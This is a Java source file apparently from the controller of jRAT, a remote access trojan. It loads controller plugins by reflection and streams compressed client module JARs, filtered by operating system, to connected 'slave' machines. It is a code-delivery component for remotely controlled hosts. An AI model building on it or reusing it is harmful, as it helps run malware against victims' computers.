package jrat.controller.modules;

import jrat.api.ControllerModule;
import jrat.common.Logger;
import jrat.common.compress.QuickLZ;
import jrat.controller.AbstractSlave;
import oslib.OperatingSystem;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public final class Module {

    private String name;

    private ControllerModule instance;

    public Module(String name) {
        this.name = name;
    }

    private File getControllerFile() {
        return new File("modules", this.name + "-controller.jar");
    }

    private File getClientFile() {
        return new File("modules", this.name + "-client.jar");
    }


    /**
     * Load the controller module
     * @throws Exception
     */
    public void load() throws Exception {
        File jar = getControllerFile();

        JarInputStream jis = new JarInputStream(new FileInputStream(jar));
        Manifest mf = jis.getManifest();
        String mainClass = mf.getMainAttributes().getValue("Main-Class");
        jis.close();

        // add module JAR to classpath
        Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        method.setAccessible(true);
        method.invoke(ClassLoader.getSystemClassLoader(), jar.toURI().toURL());

        // invoke init() on module
        Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mainClass);
        Constructor<?> ctor = clazz.getDeclaredConstructor();
        ctor.setAccessible(true);
        ControllerModule module = (ControllerModule) ctor.newInstance();
        module.init();

        instance = module;
    }

    /**
     * Write this module to the client
     * @param slave
     * @throws Exception
     */
    public void write(AbstractSlave slave) throws Exception {
        int total = 0;
        int totalUncompressed = 0;

        JarInputStream jis = new JarInputStream(new FileInputStream(getClientFile()));

        Manifest mf = jis.getManifest();
        String mainClass = mf.getMainAttributes().getValue("Main-Class");

        slave.writeLine(mainClass);

        Logger.log(mainClass);

        JarEntry entry;
        while ((entry = jis.getNextJarEntry()) != null) {
            String name = entry.getName();

            // skip native libraries incompatible with platform
            int index = name.lastIndexOf(".");
            String extension = index == -1 ? "" : name.substring(name.lastIndexOf("."));

            switch (extension) {
                case ".dylib":
                    if (slave.getOperatingSystem().getType() != OperatingSystem.MACOS) {
                        continue;
                    }
                    break;
                case ".dll":
                    if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
                        continue;
                    }
                    break;
                case ".so":
                    if (!slave.getOperatingSystem().isUnix()) {
                        continue;
                    }
                    break;
            }

            int size = (int) entry.getSize();

            if (size == 0) {
                continue;
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

            int count;
            byte[] buffer = new byte[1024];
            while ((count = jis.read(buffer)) != -1) {
                out.write(buffer, 0, count);
            }

            out.close();

            byte[] array = out.toByteArray();

            int uncompressedSize = array.length;
            totalUncompressed += array.length;

            array = QuickLZ.compress(array, 3);
            total += array.length;
            Logger.log("\tclass " + name + " (" + uncompressedSize + " -> " + array.length + " bytes)");

            slave.writeBoolean(true);
            slave.writeBoolean(name.endsWith(".class"));
            slave.writeLine(name);
            slave.writeInt(array.length);
            slave.write(array);
        }
        jis.close();

        // indicate that there are no entries left for this module
        slave.writeBoolean(false);
        Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");

        slave.loadedModules.add(instance);
    }
}
